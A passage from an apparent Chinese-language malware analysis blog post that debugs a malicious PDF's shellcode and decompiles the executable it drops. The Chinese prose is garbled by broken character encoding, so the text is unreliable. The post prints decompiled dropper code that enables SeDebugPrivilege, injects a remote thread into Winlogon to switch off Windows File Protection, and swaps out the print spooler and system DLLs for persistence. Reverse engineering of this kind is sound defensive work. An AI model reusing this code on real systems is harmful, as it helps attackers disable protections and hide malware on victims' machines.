<p>ç„¶åæˆ‘ä»¬åœ¨<code>cmp</code>é‚£é‡Œä¸‹ä¸€ä¸ªæ¡ä»¶æ–­ç‚¹ï¼Œå…å¾—ä¸€ç›´å¾ªç¯ï¼Œæˆ‘ä»¬é€‰æ‹©<code>conditional</code>è¿™æ¡ï¼Œç„¶åæ¡ä»¶å†™<code>esp == [esp+ 0x14]</code>,ç„¶åF9<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ä¸“é—¨å­˜æ”¾å‡½æ•°åçš„<code>esi</code>ï¼Œæ­¤æ—¶æ˜¯<code>ExitThread</code>ï¼Œè¯´æ˜æˆ‘ä»¬è¦å¯»æ‰¾çš„å‡½æ•°å°±æ˜¯ä»–</p>
<ol>
<li>å…ˆåœ¨å¯¼å‡ºè¡¨åç§» 0x24 å¤„è·å–è¾“å‡ºåºå·æ•°ç»„çš„åœ°å€</li>
<li>é€šè¿‡è¾“å‡ºåºå·æ•°ç»„è·å–<code>ExitThread</code>å‡½æ•°çš„åºå·ï¼Œå…¶ä¸­ ECX å°±æ˜¯åºå·</li>
<li>è·å–å‡½æ•°åœ°å€æ•°ç»„</li>
<li>æ ¹æ®åºå·åœ¨å‡½æ•°åœ°å€æ•°ç»„ä¸­æ‰¾åˆ°<code>ExitThread</code>å‡½æ•°çš„åœ°å€ï¼Œä¿å­˜åœ¨ <code>eax</code> ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹å›¾æ­¤æ—¶ <code>eax</code> å·²ç»æŒ‡<code>ExitProcess</code> å‡½æ•°ï¼ŒçŒœæµ‹åœ¨å®é™…ä¸­ï¼Œ<code>ExitThread </code>å‡½æ•°å³ä¸º<code>ExitProcess</code>å‡½æ•°<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"
                     
                ></li>
</ol>
<p>ç„¶åæ‰§è¡Œåˆ°è¿™é‡Œä¼šå°†å…¶å­˜æ”¾åœ¨[edi+ecx*4-0x4],</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">04930063    59              pop ecx</span><br><span class="line">04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess</span><br><span class="line">04930068  ^ E2 EE           loopd short 04930058</span><br></pre></td></tr></table></figure></div>

<p>æ¥ä¸‹æ¥æ¥ç€å¾ªç¯ï¼Œæ­¤æ—¶çš„<code>ecx</code>å­˜æ”¾ç€è¦è§£æçš„å‡½æ•°æ•°ç›®ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°å°†<code>eax</code>æŒ‡å‘çš„å‡½æ•°æŒ‡é’ˆä¿å­˜åœ¨å†…å­˜ä¸­æŸä¸ªä½ç½®ï¼ŒåŒæ ·åœ¨æ­¤å¤„ä¸‹ä¸€ä¸ªæ¡ä»¶æ–­ç‚¹ï¼Œæ¡ä»¶ä¸º<code>ecx == 1</code>,ç„¶åF9ï¼Œæ­¤æ—¶æ‰§è¡Œå®Œæ¯•ä¼šå‘ç°å¯¹åº”å†…å­˜å¡«å……äº†å‡½æ•°åœ°å€<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"
                     
                ></p>
<p>è°ƒç”¨<code>GetFileSize</code>å‡½æ•°ï¼Œè‹¥å‘ç°å…¶å¤§äºï¼Œæ­¤å¤„ä¼šä¸€ç›´éå†æ‰€æœ‰<code>handler</code>å¹¶è·å–æ–‡ä»¶å¤§å°ï¼Œæ¯”è¾ƒæ˜¯å¦å¤§äº 0x2000ï¼Œå¦‚æœå¤§äºåˆ™è·³è½¬åˆ° 0x493008Fã€‚åœ¨æ­¤å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åè¿è¡ŒæŸ¥çœ‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"
                     
                ></p>
<p>(è¿™é‡Œå‡ºäº†ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¹‹å‰ç”¨è®¡ç®—å™¨ç®€å•è„šæœ¬æ‰€æ‰§è¡Œçš„iso88591æ²¡æ¸…ç†å¹²å‡€ï¼Œå¯¼è‡´è¿è¡Œå§‹ç»ˆä¸å¦‚æ„ï¼Œè¿™é‡Œæˆ‘æ¢å¤è™šæ‹Ÿæœºå¿«ç…§åé‡æ–°ç¼–è¯‘äº†ä¸€éï¼Œæ­¤æ—¶å…¶ä»–çš„åŸºæœ¬æ²¡å˜ï¼Œåªæ˜¯æˆ‘ä»¬æ¶æ„ä»£ç çš„åŸºåœ°å€å˜äº†ä¸€ä¸‹è¿™é‡Œåº•ä¸‹æ‰æ˜¯æ­£ç¡®çš„è¿”å›å€¼)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"
                     
                ></p>
<p><code>esi</code>æŒ‡å‘çš„å¥æŸ„ä¸º0x310ï¼ŒæŒ‡å‘çš„<code>eax</code>ä¸ºæ–‡ä»¶å¤§å°ï¼Œä¸º0x1CAD74ï¼Œç„¶åç‚¹å‡»ä¸Šé¢çš„Hæ¥æŸ¥çœ‹ä¸€ä¸‹å†…å­˜ä¸­å­˜åœ¨çš„å¥æŸ„ï¼Œå¯ä»¥å‘ç°æ°å¥½å°±æ˜¯æ¶æ„æ–‡ä»¶pdf</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"
                     
                ></p>
<p>æ¥ä¸‹æ¥è°ƒç”¨å‡½æ•°<code>SetFRilePointer</code>ï¼Œå°†å‡½æ•°æŒ‡é’ˆåç§»åˆ°æ–‡ä»¶0x1200çš„ä½ç½®ï¼Œè¿™é‡Œå°±ä¸é€æ­¥æŸ¥çœ‹äº†ï¼Œç›´æ¥å¾€ä¸‹èµ°ï¼Œè°ƒç”¨<code>ReadFile</code>å‡½æ•°ï¼Œè¯»å–è¯¥ä½ç½®8å­—èŠ‚åˆ°æ ˆä¸Š0x0c0c0cFc<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"
                     
                ></p>
<p>æ£€æŸ¥ä¸€ä¸‹å‡ ç‚¹å›ºå®šå€¼ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™ç¡®å®šä¸ºæ¶æ„æ–‡ä»¶æœ¬èº«ï¼Œç„¶åè°ƒç”¨<code>GlobalAlloc</code>å‡½æ•°ï¼Œä»å †ä¸­åˆ†é…ä¸€å®šçš„å­—èŠ‚ï¼Œç„¶åå¡«å……0ï¼Œå¤§å°ä¸ºä¹‹å‰è·å¾—çš„é‚£ä¸ªå€¼ï¼Œåˆ†é…å¥½ç©ºé—´åï¼Œå†æ¬¡è°ƒç”¨<code>readFile</code>å°†æ¶æ„pdfè¯»å…¥å†…å­˜ä¸­<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"
                     
                ></p>
<p>è¯»å‡ºæ¥åï¼Œä½¿ç”¨å¼‚æˆ–è§£å¯† PDF ä¸­çš„ä¸€ä¸ª stream æµå¯¹è±¡<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"
                     
                ></p>
<p>è§£å¯†åå¯ä»¥çœ‹åˆ°æ ‡çº¢è¿™é‡Œæœ‰ä¸€ä¸ª<code>svrhost.exe</code>å­—ç¬¦ä¸²ï¼Œä»–è¢«æ‹¼æ¥åˆ°å³è¾¹æ ˆ0x0c0c0B40çš„ä¸´æ—¶ç›®å½•åœ°å€ä¸Šï¼Œè°ƒç”¨<code>lcreate</code>å‡½æ•°æ¥åˆ›å»ºè¯¥ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚ä¸‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"
                     
                ></p>
<p>ç›´æ¥æ­¥è¿‡ï¼Œç„¶ååˆ°ç›¸åº”æ–‡ä»¶å¤¹ä¸‹æŸ¥çœ‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ç¡®å®æœ‰è¿™ä¸ªæ–‡ä»¶äº†ï¼Œäº¤æ¢å‰0x200ä¸ªå­—èŠ‚ï¼Œä½¿å‰ 200 å­—èŠ‚æ¢å¤æˆæ­£å¸¸çš„ PE æ–‡ä»¶æ ¼å¼ï¼Œç„¶åè°ƒç”¨ <code>lwrite </code>å‡½æ•°æŠŠè§£å¯†åçš„ PE æ–‡ä»¶å†™è¿› <code>svrhost.exe</code> ä¸­<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"
                     
                ></p>
<p>è°ƒç”¨<code>WinExec</code>å‡½æ•°è¿›è¡Œæ‰§è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†ä»–å¤åˆ¶ä¸€ä»½åˆ°IDAä¸­æ‰“å¼€<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"
                     
                ></p>
<p>IDAåç¼–è¯‘å¾—åˆ°ä¸‹é¢mainå‡½æ•°</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); <span class="comment">// edi</span></span><br><span class="line">  CHAR CmdLine[<span class="number">1021</span>]; <span class="comment">// [esp+18h] [ebp-728h] BYREF</span></span><br><span class="line">  __int16 v16; <span class="comment">// [esp+415h] [ebp-32Bh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+417h] [ebp-329h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+418h] [ebp-328h] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+519h] [ebp-227h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+51Bh] [ebp-225h] BYREF</span></span><br><span class="line">  CHAR v21[<span class="number">257</span>]; <span class="comment">// [esp+51Ch] [ebp-224h] BYREF</span></span><br><span class="line">  __int16 v22; <span class="comment">// [esp+61Dh] [ebp-123h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+61Fh] [ebp-121h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+620h] [ebp-120h] BYREF</span></span><br><span class="line">  __int16 v25; <span class="comment">// [esp+721h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+723h] [ebp-1Dh]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+728h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  v3 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v3 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;\\setup\\&quot;</span>);</span><br><span class="line">  v5 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v5 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;hid128.log&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(v21, <span class="number">0x104</span>u);</span><br><span class="line">  v7 = &amp;v20;</span><br><span class="line">  <span class="keyword">while</span> ( *++v7 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;\\cmd.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(CmdLine, <span class="number">0</span>, <span class="keyword">sizeof</span>(CmdLine));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(CmdLine, <span class="string">&quot;%s /c echo 12345&gt;%s&quot;</span>, v21, Buffer);<span class="comment">// æ ¼å¼åŒ–è¾“å‡º</span></span><br><span class="line">                                                <span class="comment">// C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log</span></span><br><span class="line">  WinExec(CmdLine, <span class="number">0</span>);</span><br><span class="line">  Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">  FileA = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(FileA);</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    sub_402180();                               <span class="comment">// å…³é—­æ–‡ä»¶ä¿æŠ¤å‡½æ•°</span></span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="keyword">sizeof</span>(Filename));</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_402210(Filename) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40321D(<span class="string">&quot;Not configed, exit...\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(v12);</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  GetSystemDirectoryA(::Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;::Buffer[<span class="built_in">strlen</span>(::Buffer)] = <span class="number">92</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(::Buffer, <span class="string">&quot;spoolss.dll&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4127E8, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;byte_4127E8[<span class="built_in">strlen</span>(byte_4127E8)] = <span class="number">92</span>;</span><br><span class="line">  GetSystemDirectoryA(byte_4128F0, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4128F0, <span class="string">&quot;\\Setup\\&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4129F8, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4129F8, <span class="string">&quot;\\catroot\\&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, aSpoolsvExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, aSpoolerExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, aSetjupryExe);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, aFxjssocmExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, aMsxml0rDll);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, aMsxml0Dll);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, aMsxm32Dll);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_401FA0(ServiceName);</span><br><span class="line">  dword_413234 = sub_401A00(byte_413130);</span><br><span class="line">  <span class="keyword">if</span> ( dword_413234 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Failed!\r\n&quot;</span>);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>);</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Failed!\r\n&quot;</span>);</span><br><span class="line">    CopyFileA(ExistingFileName, byte_412D10, <span class="number">0</span>);</span><br><span class="line">    CopyFileA(::Buffer, byte_413130, <span class="number">0</span>);</span><br><span class="line">    sub_401D70(byte_4128F0, byte_4129F8);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401AD0(ServiceName);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401A00(byte_412F20) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401A00(FileName) )</span><br><span class="line">      DeleteFileA(FileName);</span><br><span class="line">    v14(byte_412F20, FileName, <span class="number">3u</span>);</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401CE0(byte_412F20, ::Buffer) )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Success!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Failed!\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    sub_401CE0(byte_412F20, ::Buffer);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-1</span>;</span><br><span class="line">  sub_401E20(ServiceName);</span><br><span class="line">  sub_401B70(<span class="number">4205738</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°é¦–å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªlogæ–‡ä»¶ï¼Œç„¶åè¾“å‡º12345åˆ°å…¶ä¸­ï¼Œä¹‹åè¿›å…¥æ³¨é‡Šçš„å…³é—­æ–‡ä»¶ä¿æŠ¤å‡½æ•°</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_402180</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 Version; <span class="comment">// ax</span></span><br><span class="line">  __int16 v3; <span class="comment">// ax</span></span><br><span class="line">  HMODULE LibraryA; <span class="comment">// eax</span></span><br><span class="line">  DWORD (__stdcall *ProcAddress)(LPVOID); <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line">  DWORD ThreadId; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ThreadId = (DWORD)this;</span><br><span class="line">  sub_4016F0();                                 <span class="comment">// ææƒå‡½æ•°ï¼Œå¯ç”¨SeDebugPreviledge</span></span><br><span class="line">  sub_401780(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  Version = GetVersion();</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)Version == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = HIBYTE(Version);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc.dll&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">      v1 = LibraryA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v3 == <span class="number">1</span> || (_BYTE)v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc_os.dll&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)<span class="number">2</span>);</span><br><span class="line">  ThreadId = <span class="number">0</span>;</span><br><span class="line">  v6 = (<span class="type">void</span> *)sub_4018B0(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v7 = CreateRemoteThread(v6, <span class="number">0</span>, <span class="number">0</span>, ProcAddress, <span class="number">0</span>, <span class="number">0</span>, &amp;ThreadId);</span><br><span class="line">  WaitForSingleObject(v7, <span class="number">0xFA0</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°<code>sub_4016F0()</code>æ˜¯ä¸€ä¸ªå…¸å‹çš„ææƒå‡½æ•°ï¼Œä»–çš„åå­—åº”è¯¥æ˜¯<code>ElvatePriviledge</code>,ä½œç”¨æ˜¯è·å– <code>SeDebugPrivilege</code> æƒé™å¹¶è®¾ç½® <code>SE_PRIVILEGE_ENABLED </code>å±æ€§æ¥å¼€å¯æƒé™,(è¿™é‡Œæ²¡ç¬¦å·è¡¨å¾ˆéš¾å—,è·Ÿè¿›æŸ¥çœ‹å¦‚ä¸‹)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4016F0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  HANDLE TokenHandle; <span class="comment">// [esp+0h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">Luid</span>;</span> <span class="comment">// [esp+4h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">NewState</span>;</span> <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  <span class="keyword">if</span> ( !OpenProcessToken(CurrentProcess, <span class="number">0x28</span>u, &amp;TokenHandle) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !LookupPrivilegeValueA(<span class="number">0</span>, <span class="string">&quot;SeDebugPrivilege&quot;</span>, &amp;Luid) )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(TokenHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Luid = Luid;</span><br><span class="line">  NewState.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0x10</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  CloseHandle(TokenHandle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å›åˆ°ä¸»å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šä¸²è®²åœæ­¢æ‰“å°æœåŠ¡è„šæœ¬å¹¶ä¸”è¿è¡Œ,è¿™é‡Œä¼šæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²<code>Spooler</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"
                     
                ></p>
<p>ç”¨ODè¿›è¡ŒåŠ¨æ€è°ƒè¯•<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ä¼šåˆ›å»ºä¸€ä¸ª<code>Temp_unstop.bat</code>,ç„¶åæˆ‘ä»¬å†™å…¥å†…å®¹</p>
